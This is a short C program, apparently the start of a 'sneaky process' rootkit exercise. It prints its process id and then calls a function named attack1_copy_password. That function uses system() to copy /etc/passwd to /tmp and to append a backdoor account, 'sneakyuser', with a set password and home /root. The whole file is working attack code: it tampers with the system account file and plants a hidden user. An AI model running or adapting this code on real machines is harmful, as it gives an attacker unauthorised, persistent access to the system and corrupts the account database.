#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void attack1_copy_password()
{
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> "
         "/etc/passwd");
}

int main()
{
  // print process id
  printf("sneaky_process pid = % d\n", getpid());
  attack1_copy_password();
  return EXIT_SUCCESS;
}